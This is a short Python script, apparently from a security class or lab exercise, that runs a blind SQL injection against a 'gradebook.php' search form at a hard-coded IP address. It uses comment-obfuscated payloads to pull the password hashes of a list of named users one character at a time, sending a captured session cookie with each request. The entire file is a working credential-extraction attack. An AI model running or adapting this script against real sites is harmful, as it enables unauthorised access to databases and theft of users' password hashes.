import requests
from time import sleep
s = requests.Session()

start = ""
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890./$"
password_payload={'search_user':'temp','submit':""}

c4 = "aaa%'or/**/1=1/**/and/**/(ascii(substring(u.password/**/from/**/"
c5 = "/**/for/**/1))="
c6 = ");--"

# c4 = "aaa%'or/**/1=1/**/and/**/(position(('"
# c5 = "')in/**/lower(u.password))="
# c6= ");--"

headers = {'Host': '128.83.34.142','User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language': 'en-US,en;q=0.5','Accept-Encoding': 'gzip, deflate','Referer': 'http://128.83.34.142/gradebook.php','Content-Type': 'application/x-www-form-urlencoded','Content-Length': '146','Cookie': 'PHPSESSID=dirdh8sfuot52b9so0534acdb0','Connection': 'close','Upgrade-Insecure-Requests': '1'}
users = {"test","test1","test2","bjones", "developer", "theyungck", "jdaniels", "zbeeblebrox", "keivaun", "kwaugh"}
userHashes= {}
for u in users:
    userHashes[u] = ""


for pos in range (1, 35):
    for c in charset:
        password_payload['search_user'] = str(c4) + str(pos) + str(c5) + str(ord(c)) + str(c6)
        result = s.post('http://128.83.34.142/gradebook.php', data=password_payload, headers=headers)
        #print (result.text)
        for u in users:
            if u in result.text:
                userHashes[u] = str(userHashes[u]) + c

        sleep(0.1)
    print (pos)

print (userHashes)


